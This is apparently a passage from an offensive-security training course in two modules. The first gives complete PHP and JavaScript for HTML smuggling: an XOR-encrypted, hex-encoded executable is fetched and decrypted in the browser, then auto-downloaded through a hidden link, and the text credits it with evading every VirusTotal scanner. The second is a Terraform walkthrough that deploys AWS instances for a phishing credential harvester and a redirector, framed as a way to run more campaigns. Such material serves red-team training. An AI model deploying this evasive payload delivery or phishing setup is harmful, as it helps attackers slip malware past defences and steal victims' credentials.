$hexEncoded = bin2hex($encryptedData);

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let hexEncoded = document.getElementById('hiddenData').textContent;
            function xorDecrypt(hexEncoded, key) {
                // Decode the hex
                let binString = '';
                for (let i = 0; i < hexEncoded.length; i += 2) {
                    binString += String.fromCharCode(parseInt(hexEncoded.substr(i, 2), 16));
                }

                // Decode XOR using the dynamic key
                let keyIndex = 0;
                let output = '';
                for (let i = 0; i < binString.length; i++) {
                    let decryptedByte = binString.charCodeAt(i) ^ key.charCodeAt(keyIndex);
                    output += String.fromCharCode(decryptedByte);
                    keyIndex = (keyIndex + 1) % key.length;
                }

                // Convert decrypted string to byte array
                const bytes = new Uint8Array(output.length);
                for (let i = 0; i < output.length; i++) {
                    bytes[i] = output.charCodeAt(i);
                }

                const blob = new Blob([bytes], { type: 'octet/stream' });
                const blobUrl = URL.createObjectURL(blob);
                const dlLink = document.getElementById('blobElement');
                dlLink.href = blobUrl;
                dlLink.click();
            }

            const key = '$key';
            xorDecrypt(hexEncoded, key);
        });
    </script>
</head>
<body>
    <div id="hiddenData" style="display:none;">$hexEncoded</div>
    <a href="" download="7zip.exe" style="visibility:hidden" id="blobElement">View</a>
</body>
</html>
HTML;
?>

```
In the video demo below, we HTML smuggle the `7zip.exe` file. Notice how the hex-encoded binary dynamically changes every time the page is reloaded, preventing the binary from having a static signature.

The video can be found in folder: `./videos/smuggling-3.mov`

## Improve Smuggling Binary Files (2)
The previous implementation can be further optimized to enhance evasiveness. In particular, avoiding direct embedding of a large block of ASCII text may help reduce the likelihood of our website appearing suspicious.

In this updated approach, we will continue using a server-side PHP script to apply dynamic XOR encryption to the binary file. However, instead of embedding the encoded data directly, we will store it in a `.txt` file and later retrieve it from the frontend for decryption and decoding. Once reconstructed, the file will be delivered using HTML smuggling.

### XOR Encrypt & Hexadecimal Encoding
The first part of our script remains unchanged from the previous implementation but is shown below for convenience. It reads the binary file, generates a random encryption key, and applies an XOR operation to obfuscate its contents. The encrypted data is then converted into a hexadecimal string for delivery and decryption on the client side.

```
<?php

$filePath = '/var/www/7zip.exe';
$binaryData = file_get_contents($filePath);
$key = bin2hex(random_bytes(16));

function xorEncryptDecrypt($input, $key) {
    $output = '';
    $keyLength = strlen($key);
    $keyIndex = 0;

    for ($i = 0; $i < strlen($input); $i++) {
        $byte = ord($input[$i]);
        $keyByte = ord($key[$keyIndex]);
        $xorByte = $byte ^ $keyByte;
        $output .= chr($xorByte);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    return $output;
}

$encryptedData = xorEncryptDecrypt($binaryData, $key);
$hexEncoded = bin2hex($encryptedData);

...
...

```

### Saving Data To File
The code below checks for any existing `.txt` files in the current directory. If a file is found, it overwrites the first matching file; otherwise, it generates a new filename using a randomly generated hexadecimal string. The encrypted and hex-encoded data is then written to this file, ensuring that the obfuscated content is stored dynamically while avoiding repetitive file creation patterns.

```
...
...

$txtFiles = glob('*.txt');
if (count($txtFiles) > 0) {
    $randomFileName = $txtFiles[0];
} else {
    $randomFileName = bin2hex(random_bytes(16)) . '.txt';
}

file_put_contents($randomFileName, $hexEncoded);

...
...

```

### Reconstructing and Smuggling Binary File
The final component of the script generates an HTML response containing a JavaScript function to fetch and decrypt the stored hex-encoded file. Using the Fetch API, it retrieves the `.txt` file containing the encrypted data and processes it with the XOR decryption function, `xorDecrypt`. The function first converts the hex-encoded string back into its binary representation, and then reverses the XOR operation using the dynamic key. Once decrypted, the binary data is converted into a `Uint8Array`, which is then used to create a `Blob`, from which a Blob URL is generated. The Blob URL is assigned to the `href` attribute of the `blobElement`, allowing it to be triggered for download.

```
echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <script>
        fetch('$randomFileName')
        .then(response => response.text())
        .then(hexEncoded => {
            function xorDecrypt(hexEncoded, key) {
                // Decode the hex
                let binString = '';
                for (let i = 0; i < hexEncoded.length; i += 2) {
                    binString += String.fromCharCode(parseInt(hexEncoded.substr(i, 2), 16));
                }

                // Decode XOR using the dynamic key
                let keyIndex = 0;
                let output = '';
                for (let i = 0; i < binString.length; i++) {
                    let decryptedByte = binString.charCodeAt(i) ^ key.charCodeAt(keyIndex);
                    output += String.fromCharCode(decryptedByte);
                    keyIndex = (keyIndex + 1) % key.length;
                }

                // Convert decrypted string to byte array
                const bytes = new Uint8Array(output.length);
                for (let i = 0; i < output.length; i++) {
                    bytes[i] = output.charCodeAt(i);
                }

                return bytes.buffer;
            }

            const decryptedBuffer = xorDecrypt(hexEncoded, '$key');

            // Create a blob URL from the decrypted binary data
            const blob = new Blob([decryptedBuffer], { type: 'octet/stream' });
            const blobUrl = URL.createObjectURL(blob);
            // console.log('Blob URL:', blobUrl);

            const dlLink = document.getElementById('blobElement');
            dlLink.href = blobUrl;
            dlLink.click();

        });
    </script>
</head>
<body>
    <a href="" download="7zip.exe" style="visibility:hidden" id="blobElement">View</a>
</body>
</html>
HTML;

```

### Complete Code
The fully updated PHP script implementing HTML smuggling is shown below.

```
<?php

$filePath = '/var/www/7zip.exe';
$binaryData = file_get_contents($filePath);
$key = bin2hex(random_bytes(16));

function xorEncryptDecrypt($input, $key) {
    $output = '';
    $keyLength = strlen($key);
    $keyIndex = 0;

    for ($i = 0; $i < strlen($input); $i++) {
        $byte = ord($input[$i]);
        $keyByte = ord($key[$keyIndex]);
        $xorByte = $byte ^ $keyByte;
        $output .= chr($xorByte);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    return $output;
}

$encryptedData = xorEncryptDecrypt($binaryData, $key);
$hexEncoded = bin2hex($encryptedData);

$txtFiles = glob('*.txt');
if (count($txtFiles) > 0) {
    $randomFileName = $txtFiles[0];
} else {
    $randomFileName = bin2hex(random_bytes(16)) . '.txt';
}

file_put_contents($randomFileName, $hexEncoded);

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <script>
        fetch('$randomFileName')
        .then(response => response.text())
        .then(hexEncoded => {
            function xorDecrypt(hexEncoded, key) {
                // Decode the hex
                let binString = '';
                for (let i = 0; i < hexEncoded.length; i += 2) {
                    binString += String.fromCharCode(parseInt(hexEncoded.substr(i, 2), 16));
                }

                // Decode XOR using the dynamic key
                let keyIndex = 0;
                let output = '';
                for (let i = 0; i < binString.length; i++) {
                    let decryptedByte = binString.charCodeAt(i) ^ key.charCodeAt(keyIndex);
                    output += String.fromCharCode(decryptedByte);
                    keyIndex = (keyIndex + 1) % key.length;
                }

                // Convert decrypted string to byte array
                const bytes = new Uint8Array(output.length);
                for (let i = 0; i < output.length; i++) {
                    bytes[i] = output.charCodeAt(i);
                }

                return bytes.buffer;
            }

            const decryptedBuffer = xorDecrypt(hexEncoded, '$key');

            // Create a blob URL from the decrypted binary data
            const blob = new Blob([decryptedBuffer], { type: 'octet/stream' });
            const blobUrl = URL.createObjectURL(blob);
            // console.log('Blob URL:', blobUrl);

            const dlLink = document.getElementById('blobElement');
            dlLink.href = blobUrl;
            dlLink.click();

        });
    </script>
</head>
<body>
    <a href="" download="7zip.exe" style="visibility:hidden" id="blobElement">View</a>
</body>
</html>
HTML;
?>

```
The video can be found in folder: `./videos/smuggling-2.mov`

We can see in the image below how the `.txt` file is fetched and contains the hex-encoded and encrypted binary.

Additionally, uploading the HTML source to VirusTotal results in zero detection from scanners and sandboxes.

Whereas on the other hand, the original template is detected as HTML/SVG smuggling.

## Objectives
Use Outflank's HTML smuggling template to smuggle a binary of your choice

Upload the smuggling template from the previous objective to VirusTotal and see the results

Update Outflank's template to use a different encoding instead of Base64 and upload it to VirusTotal. Are there any changes in the results?

Modify the fetching HTML smuggling template to fetch the binary blob from a legitimate CSS file


---

# Módulo 81 — Automatizando Infraestrutura Phishing com Terraform Terraform

Módulo 81 — Automate Phishing Infrastructure Terraform

- # Módulo 81 — Automatizando Infraestrutura Phishing com Terraform Terraform

# Disclaimer
# Módulo 81 — Automatizando Infraestrutura Phishing com Terraform: Terraform

## Introduction to Terraform
Terraform is an open-source Infrastructure as Code (IaC) tool developed by HashiCorp that lets you define, provision, and manage infrastructure using a declarative configuration language. Using Terraform, we can automate the deployment of phishing infrastructure in a consistent and quick manner.We can write configuration files using HashiCorp Configuration Language (HCL) which have files with the `.tf` or `.tf.json` extensions to define the desired state of the infrastructure to be deployed. Instead of manually creating resources via a cloud console like AWS or Azure, you codify your infrastructure so that Terraform can provision resources by automatically creating and configuring services such as virtual machines, storage buckets or any other cloud service.In this module, we will use Terraform with AWS to deploy infrastructure via code. The sections below will explain the architecture of a Terraform configuration, including providers, modules, and the Terraform Registry.
## Terraform Installation
To install Terraform, first update the system and install the HashiCorp GPG key.
```
sudo apt-get update && sudo apt-get install -y gnupg software-properties-common
wget -O- https://apt.releases.hashicorp.com/gpg | \
gpg --dearmor | \
sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg > /dev/null

```
Second, verify the key's fingerprint.
```
gpg --no-default-keyring \
--keyring /usr/share/keyrings/hashicorp-archive-keyring.gpg \
--fingerprint

```
Lastly, add the official HashiCorp repository to your system.
```
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \
https://apt.releases.hashicorp.com $(lsb_release -cs) main" | \
sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update
sudo apt-get install terraform

```

## Terraform CLI
The Terraform command line has four important commands that should be understood:
`terraform init` - Initializes the working directory.

- `terraform plan` - Preview changes before applying.

- `terraform apply` - Apply the proposed changes.

- `terraform destroy` - Destroy all the created infrastructure using.

## Using Terraform
To start using Terraform, create a `Terraform-Project` directory and a `main.tf` file inside it. This file defines and manages your infrastructure. For example, the Terraform configuration below contains a block that creates an AWS EC2 instance, sets the instance parameters, which in this case is the instance ID (`ami-0c55b159cbfafe1f0`) and the size of the instance (`t2.micro`), and assigns a name tag for easy identification (`ExampleInstance`).

```
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  tags = {
    Name = "ExampleInstance"
  }
}

```

## Variables and Outputs
So far, our directory structure looks like this:

```
Terraform-Project/
├── main.tf

```
There are two additional files worth mentioning, `variables.tf` and `outputs.tf`. The `variables.tf` file defines input variables to make the configuration more flexible and reusable. The `outputs.tf` file specifies output values, allowing important information such as resource IDs or dynamically generated values to be easily accessed after deployment. Both files will be explored later in the module.

Now, our updated directory structure looks like this:

```
Terraform-Project/
├── main.tf
├── variables.tf
├── outputs.tf

```

## Root And Child Modules
In our current setup we have the main configuration file, also known as the root module, located inside the `Terraform-Project` directory.

```
Terraform-Project/
├── main.tf # root module
├── variables.tf # optional
├── outputs.tf # optional

```
We can also create child modules, where each module handles a specific task. For example, one module may generate SSH keys, while another focuses on creating EC2 instances. In this case, we create a `modules` directory to organize these modules. Each child module will have its own `main.tf` file defining its resources.

The directory structure would look like this:

```
Terraform-Project/
├── main.tf         # Root module/main configuration file          
└── modules
    ├── ssh_keys
    │   ├── main.tf # Child module for SSH key generation     
    └── instances
        ├── main.tf # Child module for EC2 instances

```
These child modules can be referenced by the root module, which maintains organization and understandability throughout the Terraform project.

## Terraform Modules
Terraform modules are reusable configuration files that are called from your main configuration file. While everything can be implemented in the main configuration file, using Terraform modules is recommended because it promotes modularity, reusability, and easier management.

For example, we'll create a sample module that creates a Virtual Private Cloud (VPC). Inside the `Terraform-Project` directory, create the following directories:

```
mkdir -p modules/vpc

```
Within the `modules/vpc` directory, create a `main.tf` file and add the configuration below. This configuration defines two input variables: `vpc_label` (used as the VPC name tag) and `vpc_block` (representing the CIDR block). The value of these variables will be passed in to this file.

Once the values are received, this configuration file will create a VPC in AWS.

```
variable "vpc_label" {
  description = "The label (name) for the VPC"
  type        = string
}

variable "vpc_block" {
  description = "The CIDR block for the VPC"
  type        = string
}

resource "aws_vpc" "this" {
  cidr_block = var.vpc_block

  tags = {
    Name = var.vpc_label
}
}

```

### Referencing a Terraform Module
Now our main configuration file, `Terraform-Project/main.tf`, can reference the module we created in `modules/vpc` and pass the values of `vpc_label` and `vpc_block`. Notice that the values are prefixed with `var.*`, meaning they reference input variables defined in a `variables.tf` file.

```
...
...

module "vpc" {
  source = "./modules/vpc" # Load the VPC module
  vpc_label = var.vpc_name # Passed from the variables.tf file
  vpc_block = var.vpc_cidr # Passed from the variables.tf file
}

```

### Defining Variables
To define the values of the two variables, create `Terraform-Project/variables.tf`, and paste the configuration below which will set the value of `vpc_name` to `my-vpc-root` and `vpc_cidr` to `10.0.0.0/16`.

```
variable "vpc_name" {
  description = "The name of the VPC (root variable)"
  type        = string
  default     = "my-vpc-root"
}

variable "vpc_cidr" {
  description = "The CIDR block for the VPC (root variable)"
  type        = string
  default     = "10.0.0.0/16"
}

```

### Creating Outputs
Although not always required, adding outputs is recommended for testing and troubleshooting. The example below demonstrates how to expose the VPC ID from a child module to the root module using an `outputs.tf` file. To do this, create a file named `outputs.tf` in `Terraform-Project/modules/vpc` and add the following configuration:

```
output "vpc_id" {
  description = "The ID of the VPC"
  value       = aws_vpc.this.id
}

```
Then, in the root module, create another file called `outputs.tf` in `Terraform-Project/` and paste the following configuration. The configuration will reference the child module's output, therefore, when running the project it will display the VPC ID as an output.

```
output "vpc_id" {
  description = "The ID of the VPC created by the vpc module"
  value       = module.vpc.vpc_id
}

```
Our final directory structure will be as follows:

```
Terraform-Project/
├── main.tf
├── variables.tf
├── outputs.tf
└── modules/
    └── vpc/
        ├── main.tf
        └── outputs.tf

```

## Terraform Registry
The Terraform Registry is a central repository for finding and sharing modules and providers. For example, an AWS VPC module can be found here, which includes documentation, usage examples, input variables, and outputs.

Besides hosting modules, the Terraform Registry also hosts providers, which are plugins that allow Terraform to interact with external services. Providers are specified in configuration files can be defined `main.tf` or a separate `providers.tf` file. For example, to configure the latest AWS provider to use the `us-west-2` region, you would include:

```
provider "aws" {
  region  = "us-west-2"
  version = "5.19.0"
}

```

The diagram below illustrates how we use Terraform providers to interact with specific service APIs.

## AWS CLI Setup
To get started with the AWS cloud provider, sign up for an AWS account here. Next we will install the AWS Command Line Interface (AWS CLI) which is a unified tool to manage resources within the cloud services in AWS. It is recommended to view the getting started guide on the official AWS website. The commands below download and install the AWS CLI.

```
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

```

## Creating Security Credentials
Our Terraform project requires security credentials or access keys to our AWS account. To create these credentials, browse to the Identity and Access Management (IAM) pane in the AWS console. The IAM pane allows administrators to manage users, roles, permissions, and security policies related to authentication and access control. For our use case, we are creating security credentials for AWS to be used by Terraform.

Click on "Create access key" to create your root access key and associated secret key.

Once this is created, you will need to save these two values so that Terraform and AWS CLI can use them to interact with resources within our AWS account.

### Exporting Keys
Next, configure your credentials by exporting your AWS access key and secret as environment variables.

```
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

```
With your AWS credentials properly configured, Terraform is now ready to authenticate and interact with the AWS APIs.

## Deploying Phishing Infrastructure
We will be creating a Terraform project named `phishing-infra` to allow us to create phishing infrastructure. Our goal for this exercise is to use AWS and Terraform to spin up two EC2 instances, one for a phishing credential harvester (`phishing-srv`), and the other for a redirector (`phishing-redir`). Our project will be organized into the following components:

```
phishing-infra/
├── main.tf           
├── outputs.tf         
└── modules
    ├── network
    │   ├── main.tf    
    │   ├── variables.tf  
    │   └── outputs.tf    
    ├── ssh_keys
    │   ├── main.tf     
    │   ├── variables.tf  
    │   └── outputs.tf   
    └── instances
        ├── main.tf     
        ├── variables.tf 
        └── outputs.tf

```
There is a root module defined in the project's root directory, `phishing-infra/main.tf`, that is responsible for setting up and declaring the variables needed for the deployment. Additionally, `phishing-infra/outputs.tf` gives us an output of the EC2 IPs (among other things as well) that we will later need. This root module will orchestrate the overall deployment and will reference the child modules in the `modules` directory.

There are three different child modules each for different purposes. The `network` child module is responsible for creating network related resources such as security groups, and making a selection in the default VPC to create a network subnet in the region we specify. The `ssh_keys` child module is responsible for creating SSH keys. Lastly, the `instances` child module creates and tags and applies the network, keys, VPC to the instances.

### Root Module: Main.tf
To start, our first block is the AWS provider configuration which tells Terraform to use the AWS provider and sets the AWS region to `us-west-2`.

```
provider "aws" {
  region = "us-west-2"
}

```
The following block checks for the most recent official Kali Linux AMI that meets specific criteria. It filters for AMIs owned by `679593333241`, that is the official Kali Linux publisher on AWS, and selects images with names starting with `kali-last-snapshot-amd64-`. Additionally, it ensures the AMI is in an “available” state and uses HVM (Hardware Virtual Machine) virtualization.

```
data "aws_ami" "kali" {
  most_recent = true
  owners      = ["679593333241"]

  filter {
    name   = "name"
    values = ["kali-last-snapshot-amd64-*"]
  }

  filter {
    name   = "state"
    values = ["available"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}

```
The next section retrieves the current public IP from `https://ipinfo.io/ip` and stores this value as a local variable called `allowed_ssh_cidr` for SSH access. This defines a single IP that only allows SSH access from where we are running the Terraform deployment.

```
data "http" "my_ip" {
  url = "https://ipinfo.io/ip"
}

locals {
  allowed_ssh_cidr = "${trimspace(data.http.my_ip.response_body)}/32"
}

```
Next, the root module ties everything together by referencing the outputs defined earlier and passing them as inputs to the `network`, `ssh_keys`, and `instances` modules. This includes supplying the IP address used for the network security group rules, providing the necessary configuration for SSH key pair management, and provisioning the EC2 instance with the AMI ID, subnet ID, security group ID, and SSH key names.

```
module "network" {
  source           = "./modules/network"
  allowed_ssh_cidr = local.allowed_ssh_cidr
}

module "ssh_keys" {
  source = "./modules/ssh_keys"
}

module "instances" {
  source              = "./modules/instances"
  ami                 = data.aws_ami.kali.id
  instance_type       = "t2.micro"
  subnet_id           = module.network.subnet_id
  security_group_ids  = [module.network.sg_id]
  key_name_redir      = module.ssh_keys.phishing_redir_key_name
  key_name_srv        = module.ssh_keys.phishing_srv_key_name
}

```
Lastly, in `output.tf`, we will define output values to display infrastructure details such as the public IP addresses of deployed EC2 instances and the current Kali AMI ID.

```
output "phishing_redir_public_ip" {
  description = "Public IP of the phishing-redir EC2 instance"
  value       = module.instances.phishing_redir_public_ip
}

output "phishing_srv_public_ip" {
  description = "Public IP of the phishing-srv EC2 instance"
  value       = module.instances.phishing_srv_public_ip
}

output "kali_ami_id" {
  description = "The current Kali AMI ID being used"
  value       = data.aws_ami.kali.id
}

output "my_public_ip" {
  description = "Your current public IP as detected by ipinfo.io"
  value       = trimspace(data.http.my_ip.response_body)
}

```

#### Complete Configuration
Below is the complete configuration for the root module, `main.tf`.

```
provider "aws" {
  region = "us-west-2"
}

# Data: Look up the latest official Kali Linux AMI published by Kali
data "aws_ami" "kali" {
  most_recent = true
  owners      = ["679593333241"]

  filter {
    name   = "name"
    values = ["kali-last-snapshot-amd64-*"]
  }

  filter {
    name   = "state"
    values = ["available"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}

data "http" "my_ip" {
  url = "https://ipinfo.io/ip"
}

locals {
  allowed_ssh_cidr = "${trimspace(data.http.my_ip.response_body)}/32"
}

# Call the network module and pass the allowed CIDR
module "network" {
  source           = "./modules/network"
  allowed_ssh_cidr = local.allowed_ssh_cidr
}

# Call the SSH keys module
module "ssh_keys" {
  source = "./modules/ssh_keys"
}

# Call the instances module; pass AMI, instance type, subnet/SG IDs, and key names from modules
module "instances" {
  source              = "./modules/instances"
  ami                 = data.aws_ami.kali.id
  instance_type       = "t2.micro"
  subnet_id           = module.network.subnet_id
  security_group_ids  = [module.network.sg_id]
  key_name_redir      = module.ssh_keys.phishing_redir_key_name
  key_name_srv        = module.ssh_keys.phishing_srv_key_name
}

```

### Child Module: Network
All the child modules have a `main.tf`, `variables.tf`, and `outputs.tf` file. From before, we already know that the `main.tf` contains the resource blocks. As for the `variables.tf` file, it contains variable declarations used in the resource blocks. Lastly, the `outputs.tf` file contain the outputs that needs to be generated when the Terraform project is run.

The first data block in `main.tf` within the `network` child module retrieves the default VPC configuration.

```
data "aws_vpc" "default" {
  default = true
}

```
Next, the second data block retrieves a subnet in the default VPC in the `us-west-2a` availability zone.

If you see the error message: "Unsupported: Your requested instance type (t2.micro) is not supported in your requested Availability Zone", switch to a zone that supports the t2.micro instance type.

```
data "aws_subnet" "default_a" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.default.id]
  }
  filter {
    name   = "availability-zone"
    values = ["us-west-2a"]
  }
}

```
Lastly, the resource block creates a new security group within the default VPC with ingress (inbound) and egress (outbound) network traffic rules. SSH access is restricted to the `allowed_ssh_cidr` variable declared in the root module and permits all outbound traffic.

```
resource "aws_security_group" "ssh_only" {
  name        = "allow-ssh-from-specified-ip"
  description = "Allow inbound SSH only from the allowed CIDR"
  vpc_id      = data.aws_vpc.default.id

  ingress {
    description = "SSH access from allowed IP"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.allowed_ssh_cidr]
  }

  egress {
    description = "Allow all outbound traffic"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "allow-ssh-from-specified-ip"
  }
}

```
The `variables.tf` file in the child module declares an input variable, `allowed_ssh_cidr`, which enables the module to receive a value from the root module.

```
variable "allowed_ssh_cidr" {
  description = "The CIDR block allowed for SSH access"
  type        = string
}

```

#### Complete Configuration
Below is the complete `main.tf` file for the network child module.

```
data "aws_vpc" "default" {
  default = true
}

resource "aws_security_group" "ssh_only" {
  name        = "allow-ssh-from-specified-ip"
  description = "Allow inbound SSH only from the allowed CIDR"
  vpc_id      = data.aws_vpc.default.id

  ingress {
    description = "SSH access from allowed IP"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.allowed_ssh_cidr]
  }

  egress {
    description = "Allow all outbound traffic"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "allow-ssh-from-specified-ip"
  }
}

```

### Child Module: SSH_Keys
The SSH key creation module is the second module that handles the generation and management of SSH key pairs for two distinct purposes: one for the `phishing-redir` instance and one for the `phishing-srv` instance. The configuration in `main.tf` uses the TLS provider to generate RSA key pairs, registers these keys as AWS key pairs, and writes the private keys to local files with secure permissions.

The six resource blocks below generate a public key, registers the public key with AWS, and stores the private key locally for access with the proper file permissions.

```
resource "tls_private_key" "phishing_redir" {
  algorithm = "RSA"
  rsa_bits  = 2048
}

resource "aws_key_pair" "phishing_redir" {
  key_name   = var.phishing_redir_key_name
  public_key = tls_private_key.phishing_redir.public_key_openssh
}

resource "local_file" "phishing_redir_private_key" {
  content         = tls_private_key.phishing_redir.private_key_pem
  filename        = "${path.module}/phishing-redir.pem"
  file_permission = "0600"
}

resource "tls_private_key" "phishing_srv" {
  algorithm = "RSA"
  rsa_bits  = 2048
}

resource "aws_key_pair" "phishing_srv" {
  key_name   = var.phishing_srv_key_name
  public_key = tls_private_key.phishing_srv.public_key_openssh
}

resource "local_file" "phishing_srv_private_key" {
  content         = tls_private_key.phishing_srv.private_key_pem
  filename        = "${path.module}/phishing-srv.pem"
  file_permission = "0600"
}

```
The `variables.tf` file defines default key names for SSH key pairs. If no other value is provided when calling the SSH key module, the default value is used.

```
variable "phishing_redir_key_name" {
  description = "Key name for the phishing-redir SSH key pair"
  type        = string
  default     = "phishing-redir"
}

variable "phishing_srv_key_name" {
  description = "Key name for the phishing-srv SSH key pair"
  type        = string
  default     = "phishing-srv"
}

```
The `outputs.tf` file defines values that can be accessed by other modules or users after the module is applied. These outputs allow key attributes to be referenced elsewhere in the Terraform configuration.

```
output "phishing_redir_key_name" {
  description = "The key name for phishing-redir"
  value       = aws_key_pair.phishing_redir.key_name
}

output "phishing_srv_key_name" {
  description = "The key name for phishing-srv"
  value       = aws_key_pair.phishing_srv.key_name
}

```

### Child Module: Instances
The `instances` child module for EC2 instances creates two `t2.micro` EC2 compute instances. One instance is for our phishing credential harvester, and the other for the redirector. The two blocks below create two EC2 instances using shared configurations for AMI, instance type, subnet, and security groups. They simply differ in the SSH key used (allowing for distinct access control) and in their assigned tags.

```
resource "aws_instance" "phishing_redir_instance" {
  ami                    = var.ami
  instance_type          = var.instance_type
  key_name               = var.key_name_redir
  subnet_id              = var.subnet_id
  vpc_security_group_ids = var.security_group_ids

  tags = {
    Name = "kali-instance-phishing-redir"
  }
}

resource "aws_instance" "phishing_srv_instance" {
  ami                    = var.ami
  instance_type          = var.instance_type
  key_name               = var.key_name_srv
  subnet_id              = var.subnet_id
  vpc_security_group_ids = var.security_group_ids

  tags = {
    Name = "kali-instance-phishing-srv"
  }
}

```
The `variables.tf` file defines variables for the specifics of the EC2 instances and assigns key names, subnet, security group, and the proper AMI ID.

```
variable "ami" {
  description = "AMI ID to use for the instances"
  type        = string
}

variable "instance_type" {
  description = "EC2 instance type"
  type        = string
}

variable "key_name_redir" {
  description = "Key name for the phishing-redir instance"
  type        = string
}

variable "key_name_srv" {
  description = "Key name for the phishing-srv instance"
  type        = string
}

variable "subnet_id" {
  description = "Subnet ID for launching the instances"
  type        = string
}

variable "security_group_ids" {
  description = "List of security group IDs to assign to the instances"
  type        = list(string)
}

```
Lastly, the `outputs.tf` file defines and exports the public IP addresses of both EC2 instances, making them accessible in the root module outputs.

```
output "phishing_redir_public_ip" {
  description = "Public IP of the phishing-redir instance"
  value       = aws_instance.phishing_redir_instance.public_ip
}

output "phishing_srv_public_ip" {
  description = "Public IP of the phishing-srv instance"
  value       = aws_instance.phishing_srv_instance.public_ip
}

```

## Running Project
Upon creating the directory, run the `terraform init` to initialize the project. Every time a change is made, you will need to initialize the project again. A very good practice before applying changes is to run `terraform plan` which allow one to preview changes.

Once the preview is done (optional), issuing the `terraform apply` command will apply the changes and spin up everything in our root and child modules.

Check the AWS console and there should be two EC2 instances that were created.

If the changes are successfully applied, one should see all the proper outputs. When you want to perform tear-downs, simply issue the `terraform destroy` command.

## Conclusion
Automating the deployment of phishing infrastructure is an important skill for initial access tradecraft. Phishing campaigns may not always work against targets, having multiple templates and the ability to spin up and destroy your infrastructure can allow operations to become faster. The increased speed allows for a higher number of campaigns which sometimes may result in more success at gathering credentials or accomplishing your initial access goals.

## Objectives
Download, install and setup Terraform

Create a root module, main.tf, that spins up an EC2 instance

Use the outputs.tf file to print the public IP address of the EC2 instance

Spin up a redirector and phishing EC2 instances as shown in the module


---

